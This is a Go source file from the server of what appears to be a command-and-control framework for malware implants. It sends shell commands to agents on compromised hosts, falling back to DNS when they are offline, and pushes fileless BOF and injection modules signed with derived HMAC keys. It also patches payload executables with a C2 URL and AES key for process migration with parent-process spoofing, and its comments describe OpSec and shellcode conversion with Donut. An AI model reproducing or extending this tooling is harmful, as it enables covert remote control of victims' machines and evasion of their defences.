package services

import (
	"cupcake-server/pkg/globals"
	"cupcake-server/internal/model"
	"cupcake-server/pkg/paths"
	"cupcake-server/internal/storage"
	"cupcake-server/pkg/utils"
	"encoding/base64"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// SendCommand sends a shell command to the agent
func SendCommand(uuid string, command string) error {
	_, err := SendCommandWithID(uuid, command)
	return err
}

// SendCommandWithID sends a shell command and returns the correlation req_id
// so callers can wait for agent stdout via CommandLog.
func SendCommandWithID(uuid string, command string) (reqID string, err error) {
	// OpSec: 精确过滤 UI 发送的 ping 心跳包
	if command == `{"type":"ping"}` || command == "ping" {
		return "", nil
	}

	val, ok := globals.Clients.Load(uuid)
	if !ok {
		// DNS-only (or temporarily offline): queue for TXT poll protocol
		reqID = fmt.Sprintf("DNS-%d", globals.GetNextReqID())
		DNSEnqueueCommand(uuid, command)
		DNSRegisterTouch(uuid)
		_ = store.CreateCommandLogWithSource(uuid, reqID, "shell", command, "panel", "")
		return reqID, nil
	}
	client := val.(*globals.Client)

	// Unique across process restarts (counter alone collides after reboot).
	reqID = fmt.Sprintf("CMD-%d-%08x", globals.GetNextReqID(), time.Now().UnixNano()&0xffffffff)
	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "shell",
			CommandContent: command,
			ReqID:          reqID,
		},
	}

	if err := store.CreateCommandLogWithSource(uuid, reqID, "shell", command, "panel", ""); err != nil {
		return "", err
	}
	if err := WriteEncryptedMessage(client, msg); err != nil {
		return reqID, err
	}
	return reqID, nil
}

// WaitCommandOutput polls CommandLog until completed/failed or timeout.
// Returns the log row (may still be pending if timed out).
func WaitCommandOutput(reqID string, timeout time.Duration) (*model.CommandLog, error) {
	if reqID == "" {
		return nil, fmt.Errorf("empty req_id")
	}
	if timeout <= 0 {
		timeout = 30 * time.Second
	}
	deadline := time.Now().Add(timeout)
	var last *model.CommandLog
	for time.Now().Before(deadline) {
		row, err := store.GetCommandLogByReqID(reqID)
		if err == nil && row != nil {
			last = row
			if row.Status == "completed" || row.Status == "failed" {
				return row, nil
			}
		}
		time.Sleep(200 * time.Millisecond)
	}
	if last != nil {
		return last, fmt.Errorf("timeout waiting for command output")
	}
	return nil, fmt.Errorf("command log not found: %s", reqID)
}

// ModuleHMACKeyForListener returns derive_module_key(get_aes_key()) material for a listener.
func ModuleHMACKeyForListener(encryptKey, encryptionSalt string) []byte {
	rawKey := strings.TrimSpace(encryptKey)
	if rawKey == "" {
		rawKey = strings.TrimSpace(store.GetSetting("system_aes_key"))
	}
	if rawKey == "" {
		return DefaultModuleKey()
	}
	base := normalizeAESKey(rawKey)
	salt := make([]byte, 32)
	copy(salt, []byte(strings.TrimSpace(encryptionSalt)))
	return DeriveModuleKey(utils.DeriveKeyAgent(base, salt))
}

// ModuleHMACKeyForAgent returns the CKMS HMAC key matching the live agent session.
func ModuleHMACKeyForAgent(client *globals.Client) []byte {
	if client == nil {
		return DefaultModuleKey()
	}
	rawKey := strings.TrimSpace(client.EncryptKey)
	saltStr := strings.TrimSpace(client.EncryptionSalt)
	if saltStr == "" && client.ListenerID != "" {
		if val, ok := globals.Listeners.Load(client.ListenerID); ok {
			if ln, ok := val.(*globals.Listener); ok {
				saltStr = strings.TrimSpace(ln.EncryptionSalt)
				if rawKey == "" {
					rawKey = strings.TrimSpace(ln.EncryptKey)
				}
			}
		}
	}
	return ModuleHMACKeyForListener(rawKey, saltStr)
}

// SendModuleStage packs and pushes an L2 module (CKMS) to a Stage0 agent.
func SendModuleStage(uuid, moduleID string) error {
	_, err := SendModuleStageWait(uuid, moduleID, 0)
	return err
}

// SendModuleStageWait pushes module and optionally waits for agent ack (timeout>0).
func SendModuleStageWait(uuid, moduleID string, timeout time.Duration) (string, error) {
	val, ok := globals.Clients.Load(uuid)
	if !ok {
		return "", fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)

	ms := GetModuleService()
	// Agent module HMAC key = derive_module_key(get_aes_key()).
	// CRITICAL: Rust get_aes_key() uses crypto::derive_key = SHA256×100k (DeriveKeyAgent),
	// NOT Argon2id (utils.DeriveKey). Packing with Argon2 → permanent HMAC verify failed
	// while Noise traffic still works (PSK = base key only).
	moduleHMAC := ModuleHMACKeyForAgent(client)
	if len(moduleHMAC) == 0 {
		moduleHMAC = DefaultModuleKey()
		log.Printf("[Module] packing %s with DEFAULT module key (no AES on client %s)", moduleID, uuid)
	}

	// Ensure runtime bins from disk if not registered yet
	_ = ms.TryLoadDefaultRuntime(moduleID)

	// Cryptographic package trust (HMAC + anti-rollback) before stage/push.
	if err := ms.VerifyModuleBeforePush(moduleID); err != nil {
		return "", fmt.Errorf("module trust check failed: %w", err)
	}

	b64, err := ms.PackBase64WithKey(moduleID, moduleHMAC)
	if err != nil {
		return "", err
	}
	reqID := fmt.Sprintf("MOD-%d", globals.GetNextReqID())
	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "module_stage",
			CommandContent: moduleID,
			Path:           moduleID,
			Data:           b64,
			ReqID:          reqID,
		},
	}
	_ = store.CreateCommandLogWithSource(uuid, reqID, "module_stage", moduleID, "panel", "")

	var ch chan interface{}
	if timeout > 0 {
		ch = make(chan interface{}, 1)
		globals.PendingResponses.Store(reqID, ch)
		defer globals.PendingResponses.Delete(reqID)
	}

	if err := WriteEncryptedMessage(client, msg); err != nil {
		return "", err
	}
	if timeout <= 0 {
		// Fire-and-forget: do not mark loaded until agent acks (avoids false "already staged")
		return reqID, nil
	}

	select {
	case resp := <-ch:
		if m, ok := resp.(map[string]interface{}); ok {
			out, _ := m["stdout"].(string)
			se, _ := m["stderr"].(string)
			if se != "" && out == "" {
				GetModuleService().ClearAgentModule(uuid, moduleID)
				return "", fmt.Errorf("%s", se)
			}
			// HMAC / verify failures often appear in stderr with partial stdout
			if strings.Contains(strings.ToLower(se), "hmac") ||
				strings.Contains(strings.ToLower(se), "verify failed") ||
				strings.Contains(strings.ToLower(se), "module verify") {
				GetModuleService().ClearAgentModule(uuid, moduleID)
				return "", fmt.Errorf("%s", se)
			}
			GetModuleService().MarkAgentModule(uuid, moduleID)
			return out, nil
		}
		GetModuleService().MarkAgentModule(uuid, moduleID)
		return fmt.Sprintf("%v", resp), nil
	case <-time.After(timeout):
		// Do not optimistically mark — UI would block re-push and hide real failures
		log.Printf("[Module] wait ack timeout for %s on %s — NOT marking staged", moduleID, uuid)
		return "", fmt.Errorf("module_stage ack timeout for %s", moduleID)
	}
}

// SendModuleUnload asks agent to FreeLibrary / drop L2 module (burn-after-use).
func SendModuleUnload(uuid, moduleID string) error {
	val, ok := globals.Clients.Load(uuid)
	if !ok {
		return fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)
	reqID := fmt.Sprintf("MODUN-%d", globals.GetNextReqID())
	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "module_unload",
			CommandContent: moduleID,
			ReqID:          reqID,
		},
	}
	_ = store.CreateCommandLogWithSource(uuid, reqID, "module_unload", moduleID, "panel", "")
	if err := WriteEncryptedMessage(client, msg); err != nil {
		return err
	}
	GetModuleService().ClearAgentModule(uuid, moduleID)
	return nil
}

// EnsureHeavyRuntimeModule stages the L2 BOF runtime module (classic in-process COFF).
// plugins (assets/plugins) = BOF payloads; module id=bof = Manual-Map image, fileless.
// dotnet retired: convert assemblies to shellcode (e.g. Donut) and use module 'inject'.
func EnsureHeavyRuntimeModule(uuid, moduleID string) error {
	moduleID = strings.TrimSpace(strings.ToLower(moduleID))
	if moduleID == "dotnet" || moduleID == "execute_assembly" || moduleID == "iso_host" {
		return fmt.Errorf("module %q retired: BOF 用模块 'bof'；.NET 请转 shellcode（如 Donut）后走 'inject'", moduleID)
	}
	if moduleID != "bof" {
		return fmt.Errorf("unsupported runtime module %q", moduleID)
	}
	_, err := SendModuleStageWait(uuid, "bof", 45*time.Second)
	if err != nil {
		// Do not treat timeout as success — BOF exec will fail with module missing
		return err
	}
	// Brief settle so agent finishes load before first job
	time.Sleep(400 * time.Millisecond)
	return nil
}

// PendingCommandRetry holds a command to re-dispatch after module_stage succeeds.
type PendingCommandRetry struct {
	CommandType    string
	CommandContent string
	Path           string
	Data           string
	ReqID          string
	Created        time.Time
}

var pendingModuleRetries sync.Map // uuid -> PendingCommandRetry

// RememberCommandForModuleRetry stores the operator command that hit module_required.
func RememberCommandForModuleRetry(uuid string, cmd globals.CommandPayload) {
	if uuid == "" || cmd.CommandType == "" {
		return
	}
	// Avoid retrying module_* control plane commands
	ct := strings.ToLower(cmd.CommandType)
	if strings.HasPrefix(ct, "module_") {
		return
	}
	pendingModuleRetries.Store(uuid, PendingCommandRetry{
		CommandType:    cmd.CommandType,
		CommandContent: cmd.CommandContent,
		Path:           cmd.Path,
		Data:           cmd.Data,
		ReqID:          cmd.ReqID,
		Created:        time.Now(),
	})
}

// MaybeAutoPushModule inspects agent stderr for module_required:<id> and pushes once.
// On successful stage, re-dispatches a remembered operator command (if any, <60s).
func MaybeAutoPushModule(uuid, stderr string) {
	if !strings.Contains(stderr, "module_required:") {
		return
	}
	// extract id after module_required:
	idx := strings.Index(stderr, "module_required:")
	if idx < 0 {
		return
	}
	rest := stderr[idx+len("module_required:"):]
	id := rest
	for i, c := range rest {
		if c == ' ' || c == '(' || c == '\n' || c == '\r' || c == ',' {
			id = rest[:i]
			break
		}
	}
	id = strings.TrimSpace(id)
	if id == "" {
		return
	}
	// Agent reports the actual product module id (bof | inject | ad)
	stageID := id
	// Platform gate: never auto-push windows-only modules (bof/inject/ad) to non-windows agents.
	if val, ok := globals.Clients.Load(uuid); ok {
		if cl, ok2 := val.(*globals.Client); ok2 {
			if !IsModuleSupportedOnOS(stageID, cl.OS) {
				log.Printf("[Module] auto-push %s refused: module not supported on agent OS=%q", stageID, cl.OS)
				return
			}
		}
	}
	if _, err := SendModuleStageWait(uuid, stageID, 25*time.Second); err != nil {
		log.Printf("[Module] auto-push %s → %s failed: %v (upload module to storage/modules first)", stageID, uuid, err)
		return
	}
	log.Printf("[Module] auto-pushed module %s to agent %s", stageID, uuid)

	// Optional re-dispatch of the command that triggered module_required
	if v, ok := pendingModuleRetries.LoadAndDelete(uuid); ok {
		pr, ok := v.(PendingCommandRetry)
		if !ok || time.Since(pr.Created) > 60*time.Second {
			return
		}
		val, ok := globals.Clients.Load(uuid)
		if !ok {
			return
		}
		client := val.(*globals.Client)
		reqID := pr.ReqID
		if reqID == "" {
			reqID = fmt.Sprintf("RETRY-%d", globals.GetNextReqID())
		}
		msg := globals.MessageWrapper{
			MsgType: "command",
			Payload: globals.CommandPayload{
				CommandType:    pr.CommandType,
				CommandContent: pr.CommandContent,
				Path:           pr.Path,
				Data:           pr.Data,
				ReqID:          reqID,
			},
		}
		if err := WriteEncryptedMessage(client, msg); err != nil {
			log.Printf("[Module] auto-retry %s on %s failed: %v", pr.CommandType, uuid, err)
		} else {
			log.Printf("[Module] auto-retried command %s on agent %s after staging %s", pr.CommandType, uuid, stageID)
		}
	}
}

// SendModuleList asks Stage0 for currently loaded modules (module_list command).
func SendModuleList(uuid string) (string, error) {
	val, ok := globals.Clients.Load(uuid)
	if !ok {
		return "", fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)

	reqID := fmt.Sprintf("MODLIST-%d", globals.GetNextReqID())
	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "module_list",
			CommandContent: "",
			ReqID:          reqID,
		},
	}

	// Wait for matching response
	ch := make(chan interface{}, 1)
	globals.PendingResponses.Store(reqID, ch)
	defer globals.PendingResponses.Delete(reqID)

	if err := WriteEncryptedMessage(client, msg); err != nil {
		return "", err
	}

	select {
	case resp := <-ch:
		if m, ok := resp.(map[string]interface{}); ok {
			out, _ := m["stdout"].(string)
			errStr, _ := m["stderr"].(string)
			if errStr != "" && out == "" {
				return "", fmt.Errorf("%s", errStr)
			}
			GetModuleService().SetAgentModules(uuid, out)
			return out, nil
		}
		return fmt.Sprintf("%v", resp), nil
	case <-time.After(12 * time.Second):
		return "", fmt.Errorf("timeout waiting for module_list")
	}
}

// MigrateToMemory handles the migration logic (Proper implementation from old main.go)
func MigrateToMemory(uuid string, targetProcess string) error {
	val, ok := globals.Clients.Load(uuid)
	if !ok { return fmt.Errorf("agent offline") }
	client := val.(*globals.Client)

	var raw []byte
	var err error

	// Search for latest built artifact (filter by extension based on target OS)
	matches, _ := filepath.Glob(filepath.Join(paths.Join("payloads"), "*"))
	if len(matches) > 0 {
		var bestMatch string
		var bestTime time.Time
		for _, m := range matches {
			base := filepath.Base(m)
			// Windows targets: must end with .exe
			// Linux targets: must NOT end with .exe
			if client.OS == "windows" && !strings.HasSuffix(base, ".exe") { continue }
			if client.OS == "linux" && strings.HasSuffix(base, ".exe") { continue }
			
			if info, err := os.Stat(m); err == nil {
				if info.ModTime().After(bestTime) {
					bestTime = info.ModTime()
					bestMatch = m
				}
			}
		}
		if bestMatch != "" {
			raw, _ = os.ReadFile(bestMatch)
			// Artifact found silently
		}
	}

	// Fallback to templates if no built artifacts found
	if len(raw) == 0 {
		templatePath := "assets/client_template_windows.exe"
		if client.OS == "linux" {
			templatePath = "assets/client_template_linux"
		}
		raw, err = os.ReadFile(templatePath)
		if err != nil {
			log.Printf("[Migration] Error reading fallback template: %v", err)
			return fmt.Errorf("no suitable migration source found")
		}
	}

	// Patch Config for migration
	aesKey := store.GetSetting("system_aes_key")
	if client.EncryptKey != "" { aesKey = client.EncryptKey }
	
	// Determine C2 URL for the new process
	c2url := ""
	if val, ok := globals.Listeners.Load(client.ListenerID); ok {
		ln := val.(*globals.Listener)
		host := ln.PublicHost
		if host == "" { host = ln.BindIP }
		if host == "0.0.0.0" || host == "" {
			host = store.GetSetting("system_c2_host")
			if host == "" { 
				host = "127.0.0.1" 
				// Smart fallback: try to use the Local IP the agent used to connect to us
				if client.TCPConn != nil {
					if localAddr, ok := client.TCPConn.LocalAddr().(*net.TCPAddr); ok {
						if !localAddr.IP.IsUnspecified() {
							host = localAddr.IP.String()
						}
					}
				}
			}
		}

		switch strings.ToUpper(ln.Protocol) {
		case "WS", "WEBSOCKET":
			c2url = fmt.Sprintf("ws://%s:%d/socket", host, ln.Port)
		case "TCP":
			c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
		case "DNS":
			c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
		case "BIND-TCP", "正向TCP":
			c2url = fmt.Sprintf("bind://0.0.0.0:%d", ln.Port)
		default:
			c2url = fmt.Sprintf("ws://%s:%d/socket", host, ln.Port)
		}
		// Migration target resolved silently
	}

	if c2url == "" {
		globals.Listeners.Range(func(k, v interface{}) bool {
			ln := v.(*globals.Listener)
			if ln.Status == "Running" {
				host := ln.PublicHost
				if host == "" { host = ln.BindIP }
				if host == "0.0.0.0" || host == "" { host = "127.0.0.1" }

				switch strings.ToUpper(ln.Protocol) {
				case "WS", "WEBSOCKET":
					c2url = fmt.Sprintf("ws://%s:%d/socket", host, ln.Port)
					return false
				case "TCP":
					c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
					return false
				case "DNS":
					c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
					return false
				case "BIND-TCP", "正向TCP":
					c2url = fmt.Sprintf("bind://0.0.0.0:%d", ln.Port)
					return false
				}
			}
			return true
		})
	}
	if c2url == "" {
		c2url = "ws://127.0.0.1:8081/ws"
	}

	heartbeat := 10
	salt := client.EncryptionSalt
	obf := client.ObfuscateMode
	jitter := 30
	if val, ok := globals.Listeners.Load(client.ListenerID); ok {
		ln := val.(*globals.Listener)
		if salt == "" { salt = ln.EncryptionSalt }
		if obf == "" { obf = ln.ObfuscateMode }
		jitter = ln.HeartbeatJitter
		heartbeat = ln.HeartbeatInterval
	}

	patched, err := PatchPayload(raw, c2url, aesKey, heartbeat, jitter, "", false, 0, salt, obf)
	if err != nil {
		return fmt.Errorf("failed to patch migration template: %v", err)
	}

	// --- MIGRATION STRATEGY ---
	// Send raw PE EXE. Client detects MZ and spawn-from-disk with PPID spoof:
	//   Layer A (all profiles): Nt parent resolve/open + PEB CreateProcessW attributes
	//   Layer B (full/stealth-adv, Win10 1809+): try NtCreateUserProcess, else fall back to A
	// OS loader initializes CRT/TLS/stack cookies (more reliable than Donut shellcode).
	finalPayload := patched
	log.Printf("\x1b[36m[Migration]\x1b[0m Payload sent to %s (%d bytes) [spawn: Layer-A CreateProcessW / optional Layer-B NtCreateUserProcess]", uuid, len(finalPayload))

	reqID := fmt.Sprintf("MIG-%d", globals.GetNextReqID())
	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "migrate",
			CommandContent: targetProcess,
			Data:           base64.StdEncoding.EncodeToString(finalPayload),
			ReqID:          reqID,
		},
	}

	if err := WriteEncryptedMessage(client, msg); err != nil { return err }

	// [LOGGING] Record migration to DB
	_ = store.CreateCommandLog(uuid, reqID, "migrate", fmt.Sprintf("Target: %s", targetProcess))
	
	// Wait for response asynchronously or handled by GetResponse/WebSocket
	// Migration complete - agent will reconnect
	return nil
}

